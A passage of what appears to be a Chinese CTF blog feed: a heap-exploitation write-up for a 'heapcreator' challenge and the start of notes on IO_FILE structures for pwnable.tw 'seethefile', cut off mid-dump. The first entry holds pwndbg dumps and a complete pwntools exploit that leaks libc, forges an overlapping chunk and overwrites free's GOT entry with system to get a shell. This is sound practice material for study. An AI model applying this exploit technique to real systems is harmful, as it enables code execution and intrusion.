class=\"line\"><span class=\"number\">0x80</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x2368020</span> —▸ <span class=\"number\">0x7fb1f48beb78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x2368020</span></span><br></pre></td></tr></table></figure>\n<p>在重新申请堆块的过程中我们还要完成堆地址的泄露，这里其实有两个选择，一种是将 struct 申请作为 content，因为 free 的时候，struct.ptr 没有被清空，可以被泄露。另外一种就是不考虑时那种堆块，只要不是 fastbin 的最后一个，申请出来时，fd 指针没有被清空，此时我们输入的 content 只要时其最低字节就可以（heap 的地址最低三字节一定是 0x000，通过计算 可以得到对低字节）。content3 与 topchunk 相邻，释放后会与其合并，我们不需要考虑，因为 unsortedbin 里只有 0x90 的 content0，只要申请的堆块比他大，就会从 topchunk 获取，因为 0x21 大小的堆块在 fastbin 里面有好几个，就可以是的从 topchunk 连续获得两个较大的堆块，这样 edit 前面堆块就可以完成溢出，fake chunk 的构造需要一定的空间，所以我们使用了 0x50 的堆块。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fakechunk:<span class=\"number\">0x2368120</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">12</span>gx <span class=\"number\">0x0000000002368120</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x2368110</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000061</span></span><br><span class=\"line\"><span class=\"number\">0x2368120</span>:\t<span class=\"number\">0x0000000000000100</span>\t<span class=\"number\">0x0000000000000110</span><span class=\"comment\">//fakesize = victim_prev_size</span></span><br><span class=\"line\"><span class=\"number\">0x2368130</span>:\t<span class=\"number\">0x0000000002368120</span>\t<span class=\"number\">0x0000000002368120</span><span class=\"comment\">//为了方便绕过检查，fd,bk直接指向fakechunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368140</span>:\t<span class=\"number\">0x0000000002368120</span>\t<span class=\"number\">0x0000000002368120</span></span><br><span class=\"line\"><span class=\"number\">0x2368150</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368160</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"> fake_size = fake_prev_size = victimchunk-fakechunk</span><br><span class=\"line\"> pwndbg&gt; x/<span class=\"number\">18</span>gx <span class=\"number\">0x00000000023681a0</span><span class=\"number\">-0x10</span>\t\t<span class=\"comment\">//victimchunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368190</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000a1</span></span><br><span class=\"line\"><span class=\"number\">0x23681a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681c0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681e0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368200</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368210</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">24</span>gx <span class=\"number\">0x00000000023681a0</span><span class=\"number\">-0x10</span>\t\t<span class=\"comment\">//edit时覆盖victimchunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368190</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000a1</span></span><br><span class=\"line\"><span class=\"number\">0x23681a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681c0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681e0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368200</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368210</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368220</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368230</span>:\t<span class=\"number\">0x0000000000000110</span>\t<span class=\"number\">0x0000000000000130</span></span><br><span class=\"line\"><span class=\"number\">0x2368240</span>:\t<span class=\"number\">0x0000000000006262</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里就完成了布局，现在只要 free victim_chunk</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/8gx 0x0000000002368120-0x10</span><br><span class=\"line\">0x2368110:\t0x0000000000000000\t0x0000000000000061</span><br><span class=\"line\">0x2368120:\t0x0000000000000100\t0x0000000000020ee1</span><br><span class=\"line\">0x2368130:\t0x0000000002368120\t0x0000000002368120</span><br><span class=\"line\">0x2368140:\t0x0000000002368120\t0x0000000002368120</span><br><span class=\"line\">//此时fakechunk的size变了，其实这就是fakesize+victim_size+topchunk_size</span><br></pre></td></tr></table></figure>\n<p>这个时候我们在申请一个堆块，并填充一些东西（偏移量在调试中查看）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pad = <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+ <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x180</span>-<span class=\"number\">0x130</span>-<span class=\"number\">16</span>) +p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">50</span>) +p64(free_got)</span><br><span class=\"line\">add(<span class=\"number\">0x200</span>,pad)</span><br></pre></td></tr></table></figure>\n<p>新申请的堆块就是从 fakechunk 开始分配，后面自行调试偏移量</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./heapcreator&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&quot;./heapcreator&quot;</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\">Gptr = <span class=\"number\">0x006020A0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size of Heap : &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content of heap:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content of heap : &quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index :&quot;</span>,<span class=\"built_in\">str</span>(idx))\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;\\x00&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;ssss&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">main_arena = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">offset = <span class=\"number\">0x7f3d1c53cb78</span>-<span class=\"number\">0x7f3d1c178000</span></span><br><span class=\"line\"><span class=\"comment\">#aimed_addr   </span></span><br><span class=\"line\">malloc_hook=main_arena - <span class=\"number\">0x68</span></span><br><span class=\"line\">lib_base = main_arena-offset</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(lib_base))</span><br><span class=\"line\">system_addr= libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]+lib_base</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x98</span>,<span class=\"string\">&quot;aa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;\\xf0&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">heap_addr = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0xf0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">&quot;bb&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span> * ( <span class=\"number\">0x90</span>)+p64(<span class=\"number\">0x110</span>)+p64(<span class=\"number\">0x30</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(<span class=\"number\">0x100</span>)+p64(<span class=\"number\">0x110</span>)+p64(heap_addr+<span class=\"number\">0x120</span>)*<span class=\"number\">4</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+ <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x180</span>-<span class=\"number\">0x130</span>-<span class=\"number\">16</span>) +p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">50</span>) +p64(free_got)</span><br><span class=\"line\">add(<span class=\"number\">0x200</span>,pad)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(system_addr))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/19/pwnable-seethefile/",
            "url": "http://example.com/2022/03/19/pwnable-seethefile/",
            "title": "pwnable_seethefile",
            "date_published": "2022-03-19T13:44:16.000Z",
            "content_html": "<p>这篇文章主要是在简单的记录小猫在学习 IO_FILE 时候遇到的一些问题。借用 pwnable.tw 题目 seethefile</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p  *(struct _IO_FILE_plus *)0x804c410</span><br><span class=\"line\">gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等</span><br></pre></td></tr></table></figure>\n<p>32 位程序：</p>\n<ol>\n<li>\n<h3 id=\"question\"><a class=\"markdownIt-Anchor\" href=\"#question\">#</a> question</h3>\n<p>open 打开文件 fp，在未读取数据时候，plus_file 结构体中一部分数据是空的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">21</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72539000</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>此时我们看到程序开始有一个很大的堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x804c000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">1033</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">不知道这块区域的具体作用，可能是缓存区</span><br></pre></td></tr></table></figure>\n<p>当我们通过 fp 读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而 plus_file 的 read 以及 write 部分的指针会指向新开辟的堆块中的数据区域</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">22</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-72538984</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x804c000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = 